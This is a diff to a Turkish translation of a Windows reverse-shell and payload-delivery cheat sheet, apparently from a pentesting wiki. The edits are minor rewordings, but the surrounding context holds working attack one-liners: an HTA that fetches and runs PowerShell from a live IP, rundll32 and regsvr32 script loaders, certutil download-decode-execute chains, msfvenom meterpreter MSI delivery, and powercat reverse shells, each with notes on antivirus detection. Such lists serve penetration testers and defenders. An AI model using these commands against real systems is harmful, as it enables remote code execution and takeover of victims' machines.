@@ -5,7 +5,7 @@
 ## Lolbas
 
 Sayfa [lolbas-project.github.io](https://lolbas-project.github.io/) Windows için, tıpkı [https://gtfobins.github.io/](https://gtfobins.github.io/) linux için olduğu gibi.\
-Açıkça, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları yoktur**, ancak bazı **ikili dosyaların** nasıl (kötüye) kullanılabileceğini bilmek faydalıdır, bu da bazı beklenmedik eylemleri gerçekleştirmek için **rastgele kod çalıştırmak** gibi şeyleri içerir.
+Açıkça, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları yoktur**, ancak bazı **ikili dosyaların** nasıl (kötüye) kullanılabileceğini bilmek faydalıdır, böylece bazı beklenmedik eylemleri gerçekleştirmek için **rastgele kod çalıştırma** gibi. 
 
 ## NC
 ```bash
@@ -113,7 +113,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Koadic zombi'yi stager hta kullanarak çok kolay bir şekilde indirebilir ve çalıştırabilirsiniz.**
+**Koadic zombi indirmek ve çalıştırmak stager hta kullanarak çok kolaydır.**
 
 #### hta örneği
 
@@ -175,7 +175,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Defans tarafından tespit edildi**
+**Defansör tarafından tespit edildi**
 
 **Rundll32 - sct**
 
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**Buradan**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -255,15 +255,15 @@ run
 
 - [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 
 
-B64dll indirin, kodunu çözün ve çalıştırın.
+Bir B64dll indirin, kodunu çözün ve çalıştırın.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-B64exe indirin, çözün ve çalıştırın.
+B64exe indirin, çözümleyin ve çalıştırın.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Defansör tarafından tespit edildi**
+**Defans tarafından tespit edildi**
 
 ## **Cscript/Wscript**
 ```bash
@@ -289,7 +289,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Defansör tarafından tespit edildi**
+**Defans tarafından tespit edildi**
 
 ## **MSIExec**
 
@@ -298,7 +298,7 @@ Saldırgan
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Kurban:
+Mağdur:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -345,7 +345,7 @@ Kurban makinesinde C# kodunu derleyin.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Buradan temel bir C# ters kabuk indirebilirsiniz: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Buradan temel bir C# reverse shell indirebilirsiniz: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Tespit edilmedi**
 
@@ -424,13 +424,13 @@ Bir powershell başlatıcısı oluşturun, bir dosyaya kaydedin ve indirin ve ç
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Kötü amaçlı kod olarak tespit edildi**
+**Kötü niyetli kod olarak tespit edildi**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Unicorn kullanarak metasploit arka kapısının bir powershell versiyonunu oluşturun
+Unicorn kullanarak metasploit arka kapısının bir powershell versiyonunu oluşturun.
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -442,7 +442,7 @@ Bir web sunucusu başlatın ve _powershell_attack.txt_ dosyasını sunun ve kurb
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Kötü amaçlı kod olarak tespit edildi**
+**Kötü niyetli kod olarak tespit edildi**
 
 ## Daha Fazla
 
